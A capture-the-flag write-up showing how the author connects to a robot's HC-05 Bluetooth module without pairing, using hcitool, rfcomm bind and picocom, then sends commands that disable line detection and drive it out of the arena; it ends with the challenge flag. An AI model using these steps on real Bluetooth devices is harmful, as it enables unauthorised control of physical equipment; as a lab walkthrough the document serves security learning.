The goal was to move a robot equipped with an **HC-05 Bluetooth module** out of the arena — without knowing its PIN or MAC address.
I started by scanning with:

```
hcitool scan
```

I found a device named **Amber** with MAC address: `98:D3:41:F7:08:9B`.

Since brute-forcing the PIN wasn’t possible (likely due to active security protections), I looked into **bypassing pairing** to send commands directly.

The **HC-05 module** sometimes **accepts direct connections without pairing** if:

1. It's in **SLAVE mode** (which is the default),

2. No strict PIN enforcement is configured (e.g., no `+CMODE=0` or strict security),

3. A direct RFCOMM serial connection is opened and **the module accepts it**.

I tried:

```
sudo rfcomm bind 0 98:D3:41:F7:08:9B
```

Then in another terminal:

```
picocom -b 9600 /dev/rfcomm0 --omap crcrlf
```

The connection worked, as confirmed by the output:

```
picocom v3.1
port is        : /dev/rfcomm0
...
Terminal ready
Use 'help' command
```

Using `help`, I found available commands:

```
help - Show this help message  
go [forward, backward, left, right] - Move the robot  
stop - Stop the robot  
block - Block the robot  
speed [0-255] - Set or get the speed  
line [enable, disable] - Enable or disable line detection  
distance - Get the distance measured by the ultrasonic sensor
```

So I sent:

```
go forward  
line disable
speed 255  
```

This disabled line detection and made the robot drive forward out of the arena.

**Flag:** `HACKDAY{dO_YOU_L1K3_roBOT_???}`
